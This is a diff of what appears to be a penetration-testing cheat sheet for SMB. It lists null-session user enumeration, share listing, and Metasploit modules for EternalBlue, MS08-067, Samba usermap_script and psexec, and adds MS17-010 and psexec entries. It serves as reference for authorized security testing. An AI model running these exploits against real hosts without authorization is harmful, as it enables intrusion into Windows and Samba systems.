@@ -235,9 +235,12 @@ $ rpcclient -U "" <IP address>
 $ for i in $(seq 500 1100);do rpcclient -N -U "" <IP address> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
 $ samrdump.py <IP address>	
 msf> use auxiliary/scanner/smb/smb_version
+msf> use auxiliary/scanner/smb/smb_ms17_010
+msf> use exploit/windows/smb/ms17_010_psexec	
 msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> use exploit/windows/smb/ms08_067_netapi
 msf> use exploit/multi/samba/usermap_script
+msf> use exploit/windows/smb/psexec
 $ enum4linux -a <IP address>
 $ enum4linux-ng.py -A <IP address>
 $ crackmapexec smb <IP address> --shares
